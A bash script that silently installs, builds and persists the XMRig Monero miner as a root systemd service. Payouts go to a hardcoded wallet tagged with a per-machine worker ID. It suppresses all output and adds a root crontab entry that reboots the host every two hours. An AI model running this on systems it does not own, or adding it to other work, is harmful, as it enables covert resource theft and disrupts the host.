#!/bin/bash
# xmrig_setup_quiet.sh
# Quiet XMRig miner setup with no output except final message
# Usage: sudo bash xmrig_setup_quiet.sh [WORKER_ID]

set -euo pipefail

BASE_WALLET="42ZN85ZmYaKMSVZaF7hz7KCSVe73MBxH1JjJg3uQdY9d8ZcYZBCDkvoeJ5YmevGb6cPJmvWVaRoJMMEU3gcU4eCoAtkLvRE"
WORKER_ID="${1:-A00001}"
WALLET="$BASE_WALLET.$WORKER_ID"

CPU_CORES=$(nproc)
THREADS=$(( CPU_CORES > 1 ? CPU_CORES - 1 : 1 ))

{
  sudo apt update -qq
  sudo apt install -y -qq git build-essential cmake libuv1-dev libssl-dev libhwloc-dev screen curl libcap2-bin

  # Update limits.conf only if needed
  grep -qxF "* soft memlock 262144" /etc/security/limits.conf || echo -e "* soft memlock 262144\n* hard memlock 262144" | sudo tee -a /etc/security/limits.conf > /dev/null

  for f in /etc/pam.d/common-session /etc/pam.d/common-session-noninteractive; do
    if ! grep -q pam_limits.so "$f"; then
      echo 'session required pam_limits.so' | sudo tee -a "$f" > /dev/null
    fi
  done

  grep -qxF "vm.nr_hugepages=128" /etc/sysctl.conf || echo "vm.nr_hugepages=128" | sudo tee -a /etc/sysctl.conf > /dev/null
  sudo sysctl -p -q

  sudo setcap cap_sys_nice=eip "$(which screen)" >/dev/null 2>&1

  cd /root

  if [ ! -d xmrig ]; then
    git clone -q https://github.com/xmrig/xmrig.git
  fi

  cd xmrig
  mkdir -p build
  cd build

  cmake .. -Wno-dev > /dev/null 2>&1
  make -j"$CPU_CORES" > /dev/null 2>&1

  # Create systemd service
  sudo tee /etc/systemd/system/xmrig.service > /dev/null <<EOF
[Unit]
Description=XMRig Miner Service
After=network-online.target
Wants=network-online.target

[Service]
ExecStart=/root/xmrig/build/xmrig -o pool.supportxmr.com:443 -u $WALLET -k --tls --threads=$THREADS --donate-level=0 --cpu-priority=2 --randomx-mode=fast --randomx-1gb-pages
Restart=always
LimitMEMLOCK=infinity
User=root
WorkingDirectory=/root/xmrig/build
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF

  sudo chmod 644 /etc/systemd/system/xmrig.service
  sudo systemctl daemon-reload
  sudo systemctl enable xmrig --quiet

  sudo systemctl start xmrig

  # Schedule reboot every 2 hours
  (sudo crontab -l 2>/dev/null; echo "0 */2 * * * /sbin/reboot") | sudo crontab - >/dev/null 2>&1
} >/dev/null 2>&1

# Final status checks and output
if sudo systemctl is-enabled xmrig &>/dev/null && sudo systemctl is-active xmrig &>/dev/null && sudo crontab -l 2>/dev/null | grep -q '/sbin/reboot'; then
  echo "Setup complete. Miner running with wallet $WALLET."
  echo "Reboot scheduled every 2 hours."
else
  echo "Setup failed. Check manually."
  exit 1
fi
